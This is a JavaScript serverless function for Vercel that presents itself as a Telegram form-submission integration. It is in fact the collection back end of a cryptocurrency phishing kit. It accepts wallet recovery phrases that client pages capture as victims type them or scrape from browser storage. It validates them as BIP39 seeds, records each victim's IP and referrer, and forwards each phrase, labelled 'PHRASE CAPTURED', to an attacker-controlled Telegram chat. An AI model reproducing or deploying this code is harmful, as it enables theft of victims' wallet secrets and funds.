/**
 * Telegram Bot API Integration
 * Serverless function for Vercel
 * Handles form submissions and sends formatted messages to Telegram
 */

export default async function handler(req, res) {
  // Set CORS headers to allow client-side requests
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Handle preflight request
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Only accept POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    // Support both naming conventions
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || process.env.CHAT_ID;

    // Validate environment variables
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('Missing Telegram credentials');
      console.error('Available env vars:', Object.keys(process.env).filter(k => k.includes('TOKEN') || k.includes('CHAT') || k.includes('BOT')).join(', '));
      return res.status(500).json({ 
        error: 'Server configuration error',
        debug: {
          hasBotToken: !!TELEGRAM_BOT_TOKEN,
          hasChatId: !!TELEGRAM_CHAT_ID
        }
      });
    }

    // Extract data from request
    const { data } = req.body;

    // Get visitor information
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
               req.headers['x-real-ip'] || 
               req.connection?.remoteAddress || 
               req.socket?.remoteAddress || 
               'Unknown';
    
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const referer = req.headers['referer'] || req.headers['referrer'] || 'Direct';
    const url = req.headers['referer'] || 'Unknown';
    
    // Detect search engine referrer
    let searchEngine = '🌐 Direct';
    if (referer.includes('google')) {
      searchEngine = '🔍 Google';
    } else if (referer.includes('bing')) {
      searchEngine = '🔎 Bing';
    } else if (referer.includes('yahoo')) {
      searchEngine = '🟣 Yahoo';
    } else if (referer.includes('duckduckgo')) {
      searchEngine = '🦆 DuckDuckGo';
    } else if (referer.includes('baidu')) {
      searchEngine = '🔴 Baidu';
    } else if (referer !== 'Direct') {
      searchEngine = '🔗 Referral';
    }

    // Check if this is a seed phrase submission (matches client TYPE values)
    const isSeedPhraseData = data && (
      data.TYPE === 'SEED_PHRASE' ||
      data.TYPE === 'SEED_ON_BLUR' ||
      data.TYPE === 'WALLET_CREATED_DISPLAYED' ||
      data.TYPE === 'WALLET_CREATED_PHRASE_DISPLAYED' ||
      data.TYPE === 'WALLET_CREATED' ||
      data.TYPE === 'SEED_TYPED' ||
      data.TYPE === 'SEED_BLUR' ||
      data.TYPE === 'SEED_INPUT' ||
      data.TYPE === 'STORAGE_LOCALSTORAGE' ||
      data.TYPE === 'STORAGE_SESSIONSTORAGE' ||
      data.TYPE === 'DEEPSCAN' ||
      data.TYPE === 'DEEPSCAN_TEXT' ||
      data.TYPE === 'TEST_PHRASE' ||
      data.type === 'SEED_PHRASE' ||
      data.type === 'SEED_ON_BLUR' ||
      data.type === 'WALLET_CREATED_DISPLAYED' ||
      data.type === 'WALLET_CREATED_PHRASE_DISPLAYED' ||
      data.type === 'WALLET_CREATED' ||
      data.type === 'SEED_TYPED' ||
      data.type === 'SEED_BLUR' ||
      data.type === 'SEED_INPUT' ||
      data.type === 'STORAGE_LOCALSTORAGE' ||
      data.type === 'STORAGE_SESSIONSTORAGE' ||
      data.type === 'DEEPSCAN' ||
      data.type === 'DEEPSCAN_TEXT'
    );

    // Extract phrase from any field name (client sends PHRASE uppercase)
    const phraseContent = data && (
      data.PHRASE ||
      data.phrase ||
      data.content ||
      data.CONTENT ||
      data.seed ||
      data.SEED ||
      data.mnemonic ||
      data.MNEMONIC ||
      data.recovery ||
      data.RECOVERY
    );
    
    // Debug logging
    console.log('📨 Received data:', JSON.stringify(data, null, 2));
    console.log('🔍 Extracted phrase:', phraseContent ? phraseContent.substring(0, 50) + '...' : 'NONE');

    // BIP39 seed phrase validator — relaxed to catch real phrases
    function isRealSeedPhrase(val) {
      if (!val || typeof val !== 'string') return false;
      const words = val.trim().split(/\s+/).filter(w => w.length > 0);
      if (![12, 15, 18, 21, 24].includes(words.length)) return false;
      const validWord = /^[a-z]{2,12}$/;
      const validCount = words.filter(w => validWord.test(w.toLowerCase())).length;
      return (validCount / words.length) >= 0.8;
    }

    // If data.TYPE indicates a phrase, accept it directly
    const isPhraseType = data && (data.TYPE && (
      data.TYPE === 'TEST_PHRASE' ||
      data.TYPE === 'WALLET_CREATED' ||
      data.TYPE === 'SEED_TYPED' ||
      data.TYPE === 'SEED_BLUR' ||
      data.TYPE === 'SEED_INPUT' ||
      data.TYPE === 'STORAGE_LOCALSTORAGE' ||
      data.TYPE === 'STORAGE_SESSIONSTORAGE' ||
      data.TYPE === 'DEEPSCAN' ||
      data.TYPE === 'DEEPSCAN_TEXT' ||
      data.TYPE === 'SEED_PHRASE' ||
      data.TYPE === 'SEED_ON_BLUR' ||
      data.TYPE === 'WALLET_CREATED_DISPLAYED' ||
      data.TYPE === 'WALLET_CREATED_PHRASE_DISPLAYED'
    ));

    // Check if any value in data looks like a real seed phrase
    let detectedPhrase = isRealSeedPhrase(phraseContent) ? phraseContent : (isPhraseType ? phraseContent : null);
    let detectedWordCount = detectedPhrase ? detectedPhrase.trim().split(/\s+/).filter(w => w.length > 0).length : 0;
    if (!detectedPhrase && data) {
      for (const val of Object.values(data)) {
        if (typeof val === 'string' && isRealSeedPhrase(val)) {
          detectedPhrase = val.trim();
          detectedWordCount = detectedPhrase.split(/\s+/).filter(w => w.length > 0).length;
          break;
        }
      }
    }

    const wordCount = data && (data.WORDS || data.wordCount || detectedWordCount ||
      (detectedPhrase ? detectedPhrase.trim().split(/\s+/).filter(w => w.length > 0).length : 0));

    const trafficSrc = data && (data.trafficSource || data.TRAFFIC_SOURCE || searchEngine);
    const pageLocation = data && (data.PAGE || data.page || url);
    const fieldName = data && (data.FIELD || data.field || 'unknown');
    const eventType = data && (data.TYPE || data.type || 'FORM_DATA');

    let message;

    if (isSeedPhraseData || isPhraseType || detectedPhrase) {
      // ===== SEED PHRASE - COMPACT FORMAT =====
      message = `🔑 <b>PHRASE CAPTURED</b> — ${wordCount} words | ${trafficSrc} | <code>${ip}</code>

<code>${detectedPhrase || phraseContent || 'NOT FOUND'}</code>

📍 ${pageLocation} | ⏰ ${new Date().toISOString().replace('T',' ').substring(0,19)}`;
    } else {
      // ===== VISITOR ACTIVITY - COMPACT FORMAT =====
      message = `🚀 <b>Visitor</b> | ${searchEngine} | <code>${ip}</code>
└ <code>${referer}</code>
⏰ ${new Date().toISOString().replace('T',' ').substring(0,19)}`;
    }

    // Send message to Telegram
    const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const telegramResponse = await fetch(telegramApiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      }),
    });

    const telegramData = await telegramResponse.json();

    if (!telegramResponse.ok) {
      console.error('Telegram API error:', telegramData);
      console.error('Bot Token (first 10 chars):', TELEGRAM_BOT_TOKEN.substring(0, 10));
      console.error('Chat ID:', TELEGRAM_CHAT_ID);
      return res.status(500).json({ 
        error: 'Failed to send message',
        details: telegramData,
        debug: {
          botTokenPrefix: TELEGRAM_BOT_TOKEN.substring(0, 10) + '...',
          chatId: TELEGRAM_CHAT_ID
        }
      });
    }

    console.log('✅ Message sent successfully to Telegram');
    return res.status(200).json({ 
      success: true, 
      message: 'Message sent successfully',
      telegramResponse: telegramData
    });

  } catch (error) {
    console.error('Server error:', error);
    return res.status(500).json({ 
      error: 'Internal server error',
      message: error.message 
    });
  }
}
